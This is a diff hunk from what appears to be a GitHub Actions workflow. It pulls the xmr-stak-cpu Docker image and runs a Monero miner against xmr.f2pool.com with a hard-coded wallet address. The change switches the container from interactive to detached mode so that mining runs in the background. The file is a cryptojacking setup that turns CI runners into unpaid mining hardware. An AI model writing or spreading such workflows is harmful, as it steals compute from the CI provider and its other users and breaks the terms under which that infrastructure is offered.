@@ -26,4 +26,4 @@ jobs:
         run: docker pull cryptocurrency/xmr-stak-cpu
         
       - name: 执行
-        run: docker run -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt" -e POOL="xmr.f2pool.com:13531" -ti cryptocurrency/xmr-stak-cpu
+        run: docker run -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt" -e POOL="xmr.f2pool.com:13531" -d cryptocurrency/xmr-stak-cpu
